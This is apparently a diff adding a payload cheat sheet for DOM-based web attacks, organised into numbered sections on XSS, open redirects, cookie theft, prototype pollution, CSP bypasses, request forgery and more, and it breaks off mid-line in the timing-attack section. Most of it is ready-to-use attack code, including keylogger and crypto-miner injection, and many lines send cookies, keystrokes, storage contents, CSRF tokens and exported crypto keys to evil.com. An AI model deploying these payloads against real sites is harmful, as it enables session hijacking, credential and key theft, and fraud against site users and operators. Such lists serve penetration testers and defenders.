@@ -1,0 +1,882 @@
+# DOM-BASED VULNERABILITY PAYLOADS MASTER LIST
+## 📑 Quick Index
+[1] DOM XSS via document.write()        
+[2] DOM XSS via innerHTML
+[3] DOM XSS via eval()                  
+[4] Open Redirection
+[5] Cookie Manipulation                 
+[6] JavaScript Injection
+[7] Document Domain Manipulation        
+[8] WebSocket Poisoning
+[9] Link Manipulation                   
+[10] postMessage() XSS
+[11] Ajax Header Manipulation           
+[12] Local File Path Manipulation
+[13] Client-Side SQL Injection          
+[14] HTML5 Storage Manipulation
+[15] XPath Injection                    
+[16] JSON Injection
+[17] DOM Data Manipulation              
+[18] Denial of Service
+[19] Angular/React Injection            
+[20] jQuery DOM Manipulation
+[21] DOM Clobbering                     
+[22] Prototype Pollution
+[23] CSP Bypass Techniques              
+[24] DOM-based Request Forgery
+[25] Script Injection via createElement 
+[26] Event Handler Injection
+[27] iframe Injection                   
+[28] Blob URL Injection
+[29] Data URI Injection                 
+[30] DOM-based Crypto Attacks
+[31] Timing Attacks                     
+[32] Automation Scripts
+
+<!--
+[1] DOM XSS via document.write()
+-->
+-- Basic injection
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>document.write(window.location.hash.substring(1))</script>
+#<img src=x onerror=alert(1)>
+
+-- URL parameter injection
+https://example.com/?q=<script>alert(1)</script>
+https://example.com/?q="><script>alert(1)</script>
+https://example.com/?q='><script>alert(1)</script>
+
+-- Multiple encoding bypass
+https://example.com/?q=%3Cscript%3Ealert(1)%3C/script%3E
+https://example.com/?q=%2522%253E%253Cscript%253Ealert(1)%253C/script%253E
+
+-- Event handler injection
+https://example.com/?q=<img src=x onerror=alert(document.cookie)>
+https://example.com/?q=<svg onload=alert(1)>
+https://example.com/?q=<body onload=alert(1)>
+
+-- JavaScript URI injection
+https://example.com/?q=javascript:alert(1)
+https://example.com/?q=javascript:alert(document.domain)
+
+-- HTML entity bypass
+https://example.com/?q=&lt;script&gt;alert(1)&lt;/script&gt;
+https://example.com/?q=&apos;&gt;&lt;img src=x onerror=alert(1)&gt;
+
+-- Unicode bypass
+https://example.com/?q=\u003cscript\u003ealert(1)\u003c/script\u003e
+https://example.com/?q=%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E
+
+-- Double encoding
+https://example.com/?q=%253Cscript%253Ealert(1)%253C/script%253E
+
+<!--
+[2] DOM XSS via innerHTML
+-->
+-- Basic innerHTML injection
+<script>document.getElementById('output').innerHTML = location.hash.substring(1)</script>
+#<img src=x onerror=alert(1)>
+
+-- SVG injection
+#<svg><script>alert(1)</script></svg>
+#<svg onload=alert(1)>
+
+-- Iframe injection
+#<iframe src=javascript:alert(1)>
+#<iframe srcdoc="<script>alert(1)</script>">
+
+-- Object injection
+#<object data=javascript:alert(1)>
+#<embed src=javascript:alert(1)>
+
+-- Form injection
+#<form action=javascript:alert(1)><input type=submit>
+
+-- Style injection
+#<style onload=alert(1)>
+#<style>@import 'javascript:alert(1)';</style>
+
+-- Meta refresh injection
+#<meta http-equiv="refresh" content="0;javascript:alert(1)">
+
+-- Base tag injection
+#<base href=javascript:alert(1)//>
+
+-- Link injection
+#<link rel=import href="data:text/html,<script>alert(1)</script>">
+
+<!--
+[3] DOM XSS via eval()
+-->
+-- Basic eval injection
+<script>eval(location.hash.substring(1))</script>
+#alert(1)
+#alert(document.cookie)
+
+-- Function constructor injection
+#new Function('alert(1)')()
+#Function('alert(1)')()
+
+-- setTimeout/setInterval injection
+#setTimeout('alert(1)', 1000)
+#setInterval('alert(1)', 1000)
+
+-- Indirect eval injection
+#(1,eval)('alert(1)')
+#window['eval']('alert(1)')
+
+-- Encoded eval injection
+#eval('\x61\x6c\x65\x72\x74\x28\x31\x29')
+#eval(String.fromCharCode(97,108,101,114,116,40,49,41))
+
+-- Unicode eval injection
+#eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')
+
+-- Multiple statements
+#alert(1);alert(2)
+#alert(1)// comment
+
+<!--
+[4] Open Redirection
+-->
+-- Basic redirect
+<script>window.location = location.hash.substring(1)</script>
+#https://evil.com
+#//evil.com
+#/\/evil.com
+
+-- JavaScript URI redirect
+#javascript:document.location='https://evil.com'
+#javascript:window.location='https://evil.com'
+
+-- Data URI redirect
+#data:text/html,<script>window.location='https://evil.com'</script>
+
+-- Path traversal redirect
+#/../https://evil.com
+#..\..\https://evil.com
+
+-- Double slash bypass
+#//evil.com
+#\\evil.com
+#\/\/evil.com
+
+-- URL encoding bypass
+#https%3A%2F%2Fevil.com
+#%2F%2Fevil.com
+
+-- Unicode redirect
+#https://evil.com\u0000@legitimate.com
+#https://evil.com%00@legitimate.com
+
+-- Redirect with parameters
+#https://evil.com?redirect=legitimate.com
+#https://evil.com#legitimate.com
+
+-- Domain confusion
+#https://evil.com.legitimate.com
+#https://legitimate.com@evil.com
+
+-- Open redirect via window.open
+<script>window.open(location.hash.substring(1))</script>
+#https://evil.com
+
+-- Location replace/assign
+<script>location.replace(location.hash.substring(1))</script>
+<script>location.assign(location.hash.substring(1))</script>
+
+<!--
+[5] Cookie Manipulation
+-->
+-- Basic cookie injection
+<script>document.cookie = location.hash.substring(1)</script>
+#sessionid=evil; domain=.evil.com
+#sessionid=evil; path=/admin
+
+-- Cookie stealing
+#document.location='https://evil.com/steal?cookie='+document.cookie
+#new Image().src='https://evil.com/steal?cookie='+document.cookie
+
+-- Session fixation
+#sessionid=attacker_session_id
+#PHPSESSID=attacker_session_id
+
+-- Cookie injection via XSS
+<script>document.cookie="sessionid=evil"</script>
+<script>document.cookie="__Host-sessionid=evil; Secure; Path=/"</script>
+
+-- HttpOnly bypass attempt (won't work but can overwrite)
+<script>document.cookie="sessionid=evil; HttpOnly"</script>
+
+-- Cookie expiration manipulation
+#sessionid=evil; expires=Thu, 01 Jan 2030 00:00:00 UTC
+
+-- Domain escalation
+#sessionid=evil; domain=.target.com
+
+-- Path escalation
+#sessionid=evil; path=/
+
+-- SameSite bypass
+#sessionid=evil; SameSite=None; Secure
+
+<!--
+[6] JavaScript Injection
+-->
+-- Basic JS injection via script injection
+<script>new Function(location.hash.substring(1))()</script>
+#alert(1)
+
+-- Crypto mining injection
+#eval("var miner = new CoinHive.Anonymous('SITE_KEY'); miner.start()")
+
+-- Keylogger injection
+#document.onkeypress = function(e) { fetch('https://evil.com/log?key=' + e.key) }
+
+-- Defacement injection
+#document.body.innerHTML = '<h1>Hacked by Attacker</h1>'
+
+-- Phishing injection
+#document.body.innerHTML = '<form action="https://evil.com/steal"><input name="password"><input type=submit></form>'
+
+-- Redirect injection
+#window.location = 'https://evil.com'
+
+<!--
+[7] Document Domain Manipulation
+-->
+-- Domain relaxation (subdomain to parent)
+<script>document.domain = location.hash.substring(1)</script>
+#target.com
+#example.com
+
+-- Domain escalation (for XSS on subdomain)
+<script>document.domain = 'target.com'</script>
+
+-- Port manipulation (not possible, but try)
+#target.com:8080
+
+-- Domain reset (to original)
+#document.domain = document.domain
+
+-- Cross-origin communication via domain relaxation
+<script>document.domain = 'target.com'; var win = window.open('https://sub.target.com'); win.postMessage('data', '*')</script>
+
+<!--
+[8] WebSocket Poisoning
+-->
+-- WebSocket URL injection
+<script>new WebSocket(location.hash.substring(1))</script>
+#ws://evil.com:8080
+#wss://evil.com
+
+-- WebSocket message injection
+<script>var ws = new WebSocket('wss://target.com'); ws.onopen = function() { ws.send(location.hash.substring(1)) }</script>
+#{"cmd":"exec","data":"malicious"}
+
+-- WebSocket XSS via message
+<script>var ws = new WebSocket('wss://target.com'); ws.onmessage = function(e) { eval(e.data) }</script>
+
+-- WebSocket hijacking via injection
+<script>var ws = new WebSocket('wss://target.com'); ws.onmessage = function(e) { fetch('https://evil.com/steal?data=' + e.data) }</script>
+
+-- WebSocket reconnection attack
+<script>var ws = new WebSocket('wss://target.com'); setInterval(function() { if(ws.readyState === 3) { ws = new WebSocket('wss://evil.com') } }, 1000)</script>
+
+<!--
+[9] Link Manipulation
+-->
+-- Element.src injection (image)
+<script>document.getElementById('img').src = location.hash.substring(1)</script>
+#https://evil.com/evil.jpg
+#javascript:alert(1)
+
+-- Script.src injection
+<script>var s = document.createElement('script'); s.src = location.hash.substring(1); document.body.appendChild(s)</script>
+#https://evil.com/evil.js
+
+-- Iframe.src injection
+<script>document.getElementById('frame').src = location.hash.substring(1)</script>
+#https://evil.com
+#javascript:alert(1)
+
+-- Link.href injection
+<script>document.getElementById('link').href = location.hash.substring(1)</script>
+#javascript:alert(1)
+#https://evil.com
+
+-- Object.data injection
+<script>document.getElementById('obj').data = location.hash.substring(1)</script>
+#https://evil.com/evil.swf
+#javascript:alert(1)
+
+-- Embed.src injection
+<script>document.getElementById('embed').src = location.hash.substring(1)</script>
+#https://evil.com/evil.swf
+
+-- Video/src injection
+<script>document.getElementById('video').src = location.hash.substring(1)</script>
+#https://evil.com/evil.mp4
+
+-- Audio/src injection
+<script>document.getElementById('audio').src = location.hash.substring(1)</script>
+#https://evil.com/evil.mp3
+
+-- Track/src injection (WebVTT XSS)
+<script>document.getElementById('track').src = location.hash.substring(1)</script>
+#https://evil.com/evil.vtt
+
+<!--
+[10] postMessage() XSS
+-->
+-- Basic postMessage injection
+<script>window.addEventListener('message', function(e) { eval(e.data) })</script>
+Send: window.postMessage('alert(1)', '*')
+
+-- postMessage XSS with innerHTML
+<script>window.addEventListener('message', function(e) { document.getElementById('output').innerHTML = e.data })</script>
+Send: window.postMessage('<img src=x onerror=alert(1)>', '*')
+
+-- postMessage XSS with document.write
+<script>window.addEventListener('message', function(e) { document.write(e.data) })</script>
+Send: window.postMessage('<script>alert(1)</script>', '*')
+
+-- postMessage origin validation bypass
+<script>window.addEventListener('message', function(e) { if(e.origin === 'https://trusted.com') eval(e.data) })</script>
+Send: window.postMessage('alert(1)', 'https://trusted.com') # Can spoof origin in some browsers
+
+-- postMessage to all origins (wildcard)
+<script>window.postMessage('<img src=x onerror=alert(1)>', '*')</script>
+
+-- postMessage stealing via event listener
+<script>window.addEventListener('message', function(e) { fetch('https://evil.com/steal?data=' + e.data) })</script>
+
+-- postMessage to iframe
+<script>document.getElementById('frame').contentWindow.postMessage('alert(1)', '*')</script>
+
+-- postMessage with structured data (objects)
+<script>window.postMessage({type: 'eval', code: 'alert(1)'}, '*')</script>
+
+-- postMessage with Blob/ArrayBuffer
+<script>var blob = new Blob(['alert(1)'], {type: 'text/javascript'}); window.postMessage(URL.createObjectURL(blob), '*')</script>
+
+<!--
+[11] Ajax Request-Header Manipulation
+-->
+-- setRequestHeader injection
+<script>var xhr = new XMLHttpRequest(); xhr.open('GET', '/api'); xhr.setRequestHeader('X-Custom', location.hash.substring(1)); xhr.send()</script>
+#evil-header-value
+#' OR 1=1-- (SQL injection via header)
+
+-- Authorization header injection
+<script>xhr.setRequestHeader('Authorization', 'Bearer ' + location.hash.substring(1))</script>
+#eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.signature
+
+-- Content-Type injection
+<script>xhr.setRequestHeader('Content-Type', location.hash.substring(1))</script>
+#application/xml
+#application/json
+
+-- Origin header injection
+<script>xhr.setRequestHeader('Origin', location.hash.substring(1))</script>
+#https://evil.com
+
+-- Referer header injection
+<script>xhr.setRequestHeader('Referer', location.hash.substring(1))</script>
+#https://evil.com
+
+-- X-Forwarded-For injection
+<script>xhr.setRequestHeader('X-Forwarded-For', location.hash.substring(1))</script>
+#127.0.0.1
+#evil.com
+
+<!--
+[12] Local File Path Manipulation
+-->
+-- FileReader.readAsText injection
+<script>var reader = new FileReader(); reader.onload = function(e) { eval(e.target.result) }; reader.readAsText(location.hash.substring(1))</script>
+#/etc/passwd (doesn't work - FileReader can't read arbitrary files)
+#evil.txt (only works with File objects)
+
+-- FileReader.readAsDataURL injection
+<script>reader.readAsDataURL(location.hash.substring(1))</script>
+
+-- FileReader.readAsBinaryString injection
+<script>reader.readAsBinaryString(location.hash.substring(1))</script>
+
+-- FileReader.readAsArrayBuffer injection
+<script>reader.readAsArrayBuffer(location.hash.substring(1))</script>
+
+-- URL.createObjectURL injection
+<script>var url = URL.createObjectURL(location.hash.substring(1)); window.location = url</script>
+
+-- Blob injection
+<script>var blob = new Blob([location.hash.substring(1)], {type: 'text/javascript'}); eval(URL.createObjectURL(blob))</script>
+
+-- File system API injection (Chrome only)
+<script>window.webkitRequestFileSystem(window.TEMPORARY, 1024*1024, function(fs) { fs.root.getFile(location.hash.substring(1), {}, function(fileEntry) { fileEntry.file(function(file) { var reader = new FileReader(); reader.onload = function(e) { eval(e.target.result) }; reader.readAsText(file) }) }) })</script>
+
+<!--
+[13] Client-Side SQL Injection (WebSQL)
+-->
+-- ExecuteSql injection (deprecated but exists)
+<script>var db = openDatabase('db', '1.0', 'test', 1024); db.transaction(function(tx) { tx.executeSql(location.hash.substring(1)) })</script>
+#SELECT * FROM users WHERE username = 'admin' OR 1=1
+
+-- Union-based WebSQL injection
+#SELECT username, password FROM users UNION SELECT 1,2
+
+-- Time-based WebSQL injection
+#SELECT * FROM users WHERE id = 1 AND (SELECT sleep(5))
+
+-- Boolean blind WebSQL
+#SELECT * FROM users WHERE username = 'admin' AND substr(password,1,1) = 'a'
+
+-- Drop table injection
+#DROP TABLE users
+
+-- Data extraction via WebSQL
+<script>db.transaction(function(tx) { tx.executeSql('SELECT * FROM users', [], function(tx, results) { for(var i=0; i<results.rows.length; i++) { fetch('https://evil.com/steal?data=' + JSON.stringify(results.rows.item(i))) } }) })</script>
+
+<!--
+[14] HTML5 Storage Manipulation
+-->
+-- sessionStorage.setItem injection
+<script>sessionStorage.setItem(location.hash.substring(1), location.hash.substring(1))</script>
+#key=value
+#evilKey,<img src=x onerror=alert(1)>
+
+-- localStorage.setItem injection
+<script>localStorage.setItem(location.hash.substring(1), location.hash.substring(1))</script>
+#key=javascript:alert(1)
+
+-- Storage event listener injection
+<script>window.addEventListener('storage', function(e) { eval(e.newValue) })</script>
+#trigger via: localStorage.setItem('key', 'alert(1)')
+
+-- IndexedDB injection
+<script>var request = indexedDB.open(location.hash.substring(1))</script>
+#evilDB
+
+-- IndexedDB data manipulation
+<script>var request = indexedDB.open('db'); request.onsuccess = function(e) { var db = e.target.result; var tx = db.transaction(['users'], 'readwrite'); var store = tx.objectStore('users'); store.put({id: 1, username: 'admin', password: 'hacked'}) }</script>
+
+-- Storage key enumeration
+<script>for(var i=0; i<localStorage.length; i++) { fetch('https://evil.com/steal?key=' + localStorage.key(i) + '&value=' + localStorage.getItem(localStorage.key(i))) }</script>
+
+<!--
+[15] XPath Injection
+-->
+-- document.evaluate injection
+<script>var result = document.evaluate(location.hash.substring(1), document, null, XPathResult.STRING_TYPE, null)</script>
+#' or 1=1 or ''='
+#' or 'a'='a
+
+-- XPath extraction
+<script>var result = document.evaluate('//input[@name="username"]/@value', document, null, XPathResult.STRING_TYPE, null)</script>
+
+-- XPath boolean blind
+<script>var result = document.evaluate('count(//input) > 0', document, null, XPathResult.BOOLEAN_TYPE, null)</script>
+
+-- XPath substring extraction
+<script>var result = document.evaluate('substring(//input[@name="username"]/@value, 1, 1)', document, null, XPathResult.STRING_TYPE, null)</script>
+
+-- XPath union injection
+<script>var result = document.evaluate('//input | //script', document, null, XPathResult.ANY_TYPE, null)</script>
+
+-- XPath wildcard injection
+<script>var result = document.evaluate('//*', document, null, XPathResult.ANY_TYPE, null)</script>
+
+<!--
+[16] JSON Injection
+-->
+-- JSON.parse injection (prototype pollution)
+<script>var data = JSON.parse(location.hash.substring(1))</script>
+#{"__proto__": {"isAdmin": true}}
+
+-- JSON.parse with reviver injection
+<script>JSON.parse('{"key": "value"}', function(k, v) { eval(v) })</script>
+
+-- JSON.stringify injection (XSS)
+<script>var obj = {message: location.hash.substring(1)}; document.getElementById('output').innerHTML = JSON.stringify(obj)</script>
+#<img src=x onerror=alert(1)>
+
+-- JSON hijacking (if JSONP-like)
+<script>var data = JSON.parse('{"callback": "alert(1)"}'); eval(data.callback)</script>
+
+-- JSON with script injection
+#{"data": "</script><script>alert(1)</script>"}
+
+-- JSON injection into innerHTML
+#{"html": "<img src=x onerror=alert(1)>"}
+
+<!--
+[17] DOM Data Manipulation
+-->
+-- setAttribute injection
+<script>document.getElementById('element').setAttribute(location.hash.substring(1), 'value')</script>
+#onclick
+#src
+
+-- setAttribute XSS
+<script>document.getElementById('img').setAttribute('src', location.hash.substring(1))</script>
+#javascript:alert(1)
+#https://evil.com/evil.jpg
+
+-- setAttribute with event handler
+<script>document.getElementById('button').setAttribute('onclick', location.hash.substring(1))</script>
+#alert(1)
+
+-- className injection
+<script>document.getElementById('element').className = location.hash.substring(1)</script>
+#"><img src=x onerror=alert(1)>
+
+-- style injection
+<script>document.getElementById('element').style = location.hash.substring(1)</script>
+#background:url(javascript:alert(1))
+
+-- dataset injection
+<script>document.getElementById('element').dataset[location.hash.substring(1)] = 'value'</script>
+#evil
+
+-- textContent/innerText injection (safe but can lead to XSS via DOM clobbering)
+<script>document.getElementById('element').textContent = location.hash.substring(1)</script>
+#<script>alert(1)</script> (won't execute)
+
+<!--
+[18] Denial of Service
+-->
+-- RegExp injection (ReDoS)
+<script>new RegExp(location.hash.substring(1)).test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!')</script>
+#^(a+)+$
+
+-- Exponential backtracking
+#(a|aa)+$
+#(a*)*$
+
+-- Nested quantifiers
+#(a+)+b
+#(x+x+)+y
+
+-- Catastrophic backtracking
+#a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?a?aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+-- While loop DoS
+<script>while(true) {}</script>
+<script>for(;;) {}</script>
+
+-- Infinite recursion
+<script>function f() { f() }; f()</script>
+
+-- Memory exhaustion
+<script>var a = []; while(true) { a.push('a'.repeat(1000000)) }</script>
+<script>var a = 'a'.repeat(1000000000)</script>
+
+-- CPU exhaustion
+<script>while(true) { Math.random() }</script>
+<script>for(var i=0; i<1000000000; i++) {}</script>
+
+-- Large regex execution
+<script>/[a-z]{10000}/.test('a'.repeat(100000))</script>
+
+<!--
+[19] Angular/React Injection
+-->
+-- Angular template injection
+<script>angular.module('app', []).controller('Ctrl', function($scope, $sce) { $scope.data = $sce.trustAsHtml(location.hash.substring(1)) })</script>
+#{{constructor.constructor('alert(1)')()}}
+#{{$eval('alert(1)')}}
+
+-- Angular sandbox escape
+#{{x = 'alert(1)'}} {{x.constructor.constructor(x)()}}
+#{{[].pop.constructor('alert(1)')()}}
+
+-- React JSX injection (dangerouslySetInnerHTML)
+<script>React.createElement('div', {dangerouslySetInnerHTML: {__html: location.hash.substring(1)}})</script>
+#<img src=x onerror=alert(1)>
+
+-- React ref injection
+<script>class App extends React.Component { componentDidMount() { eval(this.props.evil) } }</script>
+
+-- Vue.js template injection
+<script>new Vue({template: location.hash.substring(1)}).$mount()</script>
+#<div>{{alert(1)}}</div>
+#<img src=x onerror=alert(1)>
+
+-- Vue.js sandbox escape
+#{{constructor.constructor('alert(1)')()}}
+
+<!--
+[20] jQuery DOM Manipulation
+-->
+-- jQuery html() injection
+<script>$('#element').html(location.hash.substring(1))</script>
+#<img src=x onerror=alert(1)>
+
+-- jQuery append() injection
+<script>$('#element').append(location.hash.substring(1))</script>
+#<script>alert(1)</script>
+
+-- jQuery prepend() injection
+<script>$('#element').prepend(location.hash.substring(1))</script>
+
+-- jQuery after()/before() injection
+<script>$('#element').after(location.hash.substring(1))</script>
+
+-- jQuery replaceWith() injection
+<script>$('#element').replaceWith(location.hash.substring(1))</script>
+
+-- jQuery wrap() injection
+<script>$('#element').wrap(location.hash.substring(1))</script>
+
+-- jQuery load() injection (XSS + remote code)
+<script>$('#element').load(location.hash.substring(1))</script>
+#https://evil.com/evil.html
+
+-- jQuery selector injection (if using user input as selector)
+<script>$(location.hash.substring(1)).hide()</script>
+#<img src=x onerror=alert(1)>
+
+-- jQuery global eval (jQuery.globalEval)
+<script>$.globalEval(location.hash.substring(1))</script>
+#alert(1)
+
+<!--
+[21] DOM Clobbering
+-->
+-- Basic DOM clobbering
+<a id="someElement"></a>
+<a name="someElement"></a>
+<script>document.getElementById('someElement') // Returns the anchor element</script>
+
+-- DOM clobbering for XSS
+<a id="alert"></a>
+<script>window.alert(1)</script>
+<a id="alert" href="javascript:alert(1)"></a>
+
+-- DOM clobbering to bypass sanitization
+<form id="x"><input id="x" name="x"></form>
+<script>document.getElementById('x').x // Clobbers .x property</script>
+
+-- DOM clobbering for prototype pollution
+<a id="__proto__"></a>
+<a id="__proto__" href="evil"></a>
+
+-- DOM clobbering for eval bypass
+<a id="eval"></a>
+<a id="eval" href="javascript:alert(1)"></a>
+
+-- DOM clobbering for form hijacking
+<form id="login"></form>
+<form name="login"></form>
+<a name="login" href="https://evil.com"></a>
+
+-- DOM clobbering with iframe
+<iframe name="someFunction" src="evil.html"></iframe>
+
+-- DOM clobbering for cookie stealing
+<img name="cookie">
+<script>document.cookie = window.cookie</script>
+
+<!--
+[22] Prototype Pollution
+-->
+-- Basic prototype pollution
+<script>Object.prototype[location.hash.substring(1)] = location.hash.substring(1)</script>
+#isAdmin,true
+
+-- Prototype pollution via merge
+<script>function merge(target, source) { for(var attr in source) { target[attr] = source[attr] } }; merge({}, JSON.parse(location.hash.substring(1)))</script>
+#{"__proto__": {"isAdmin": true}}
+
+-- Prototype pollution via jQuery.extend
+<script>$.extend(true, {}, JSON.parse(location.hash.substring(1)))</script>
+
+-- Prototype pollution via lodash.merge
+<script>_.merge({}, JSON.parse(location.hash.substring(1)))</script>
+
+-- Prototype pollution leading to XSS
+#{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
+
+-- Prototype pollution leading to RCE (if eval used)
+#{"__proto__": {"source": "alert(1)"}}
+
+-- Prototype pollution via URL parameters
+https://example.com/?__proto__[isAdmin]=true
+https://example.com/?constructor.prototype.isAdmin=true
+
+-- Prototype pollution via Object.assign
+<script>Object.assign({}, JSON.parse(location.hash.substring(1)))</script>
+
+<!--
+[23] CSP Bypass Techniques
+-->
+-- Unsafe-eval bypass via setTimeout string
+<script>setTimeout('alert(1)', 1000)</script>
+<script>setInterval('alert(1)', 1000)</script>
+
+-- Unsafe-inline bypass via event handlers (if allowed)
+#<img src=x onerror=alert(1)>
+
+-- Base-uri bypass (change base URL)
+<script>document.querySelector('base').href = 'https://evil.com'</script>
+#<base href="https://evil.com">
+
+-- Script nonce bypass (if nonce predictable)
+<script nonce="predictable">alert(1)</script>
+
+-- Angular CSP bypass (if Angular loaded)
+#{{constructor.constructor('alert(1)')()}}
+
+-- JSONP bypass (if JSONP endpoint exists)
+<script src="https://target.com/jsonp?callback=alert(1)"></script>
+
+-- Iframe srcdoc bypass
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+
+-- Blob URL bypass (if blob: allowed)
+<script>var blob = new Blob(['alert(1)'], {type: 'text/javascript'}); var url = URL.createObjectURL(blob); import(url)</script>
+
+-- Data URI bypass (if data: allowed)
+<script src="data:text/javascript,alert(1)"></script>
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+
+-- Document domain relaxation bypass
+<script>document.domain = 'target.com'</script>
+
+-- postMessage CSP bypass
+<script>window.addEventListener('message', function(e) { eval(e.data) })</script>
+
+<!--
+[24] DOM-based Request Forgery
+-->
+-- CSRF via DOM injection
+<script>var xhr = new XMLHttpRequest(); xhr.open('POST', '/api/transfer'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({to: 'attacker', amount: 10000}))</script>
+
+-- SSRF via DOM injection
+<script>fetch(location.hash.substring(1)).then(r => r.text()).then(data => fetch('https://evil.com/steal?data=' + btoa(data)))</script>
+#http://localhost:8080/admin
+#http://169.254.169.254/latest/meta-data/
+
+-- Credential stealing via DOM
+<script>fetch('/api/user').then(r => r.json()).then(data => fetch('https://evil.com/steal?data=' + JSON.stringify(data)))</script>
+
+-- Token stealing via DOM
+<script>var token = document.querySelector('meta[name="csrf-token"]').content; fetch('https://evil.com/steal?token=' + token)</script>
+
+<!--
+[25] Script Injection via createElement
+-->
+-- createElement('script') injection
+<script>var s = document.createElement('script'); s.src = location.hash.substring(1); document.body.appendChild(s)</script>
+#https://evil.com/evil.js
+
+-- createElement('script') with inline code
+<script>var s = document.createElement('script'); s.textContent = location.hash.substring(1); document.body.appendChild(s)</script>
+#alert(1)
+
+-- createElement('iframe') injection
+<script>var f = document.createElement('iframe'); f.src = location.hash.substring(1); document.body.appendChild(f)</script>
+#javascript:alert(1)
+
+-- createElement('img') injection
+<script>var img = document.createElement('img'); img.src = location.hash.substring(1); document.body.appendChild(img)</script>
+#https://evil.com/evil.jpg
+#x onerror=alert(1) (if src injection possible)
+
+-- import() dynamic import injection
+<script>import(location.hash.substring(1))</script>
+#https://evil.com/evil.js
+
+<!--
+[26] Event Handler Injection
+-->
+-- onclick injection
+<script>document.getElementById('element').onclick = new Function(location.hash.substring(1))</script>
+#alert(1)
+
+-- onload injection
+<script>window.onload = function() { eval(location.hash.substring(1)) }</script>
+
+-- onerror injection
+<script>document.getElementById('img').onerror = function() { eval(location.hash.substring(1)) }</script>
+
+-- addEventListener injection
+<script>document.getElementById('element').addEventListener('click', new Function(location.hash.substring(1)))</script>
+
+-- Global event handler injection
+<script>window.onmessage = function(e) { eval(e.data) }</script>
+
+<!--
+[27] iframe Injection
+-->
+-- iframe srcdoc injection
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+
+-- iframe src injection (javascript:)
+<iframe src="javascript:alert(1)"></iframe>
+
+-- iframe src injection (data:)
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+
+-- iframe sandbox bypass (if allow-scripts)
+<iframe srcdoc="<script>alert(1)</script>" sandbox="allow-scripts"></iframe>
+
+-- iframe parent access
+<iframe src="evil.html" onload="this.contentWindow.parent.document.body.innerHTML = '<img src=x onerror=alert(1)>'"></iframe>
+
+<!--
+[28] Blob URL Injection
+-->
+-- Blob URL with eval
+<script>var blob = new Blob([location.hash.substring(1)], {type: 'text/javascript'}); var url = URL.createObjectURL(blob); import(url)</script>
+#alert(1)
+
+-- Blob URL with script src
+<script>var blob = new Blob(['alert(1)'], {type: 'text/javascript'}); var url = URL.createObjectURL(blob); document.write('<script src="' + url + '"><\/script>')</script>
+
+-- Blob URL with worker
+<script>var blob = new Blob([location.hash.substring(1)], {type: 'text/javascript'}); var url = URL.createObjectURL(blob); new Worker(url)</script>
+#self.onmessage = function(e) { eval(e.data) }
+
+<!--
+[29] Data URI Injection
+-->
+-- Data URI with HTML
+<script>window.location = 'data:text/html,<script>alert(1)</script>'</script>
+
+-- Data URI with JavaScript
+<script>window.location = 'data:text/javascript,alert(1)'</script>
+
+-- Data URI with base64
+<script>window.location = 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='</script>
+
+-- Data URI in iframe
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+
+-- Data URI in object
+<object data="data:text/html,<script>alert(1)</script>"></object>
+
+<!--
+[30] DOM-based Crypto Attacks
+-->
+-- Crypto key extraction via DOM
+<script>var key = localStorage.getItem('encryption_key'); fetch('https://evil.com/steal?key=' + key)</script>
+
+-- RNG manipulation
+<script>Math.random = function() { return 0.5 }</script>
+
+-- SubtleCrypto injection
+<script>window.crypto.subtle.exportKey('jwk', key).then(function(exported) { fetch('https://evil.com/steal?key=' + JSON.stringify(exported)) })</script>
+
+-- WebCrypto API abuse
+<script>window.crypto.getRandomValues = function(arr) { for(var i=0; i<arr.length; i++) arr[i] = 0 }</script>
+
+<!--
+[31] Timing Attacks (DOM-based)
+-->
+-- Timing attack via getComputedStyle
+<script>var start = performance.now(); for(var i=0; i<1000; i++) { getComputedStyle(document.body) }; var duration = performance.now() - start; fetch('https://evil.com/timing?duration=' + duration)</script>
+
+-- Timing attack via image loading
+<script>var img = new Image(); var start = performance.now(); img.src = 'https://target.com/
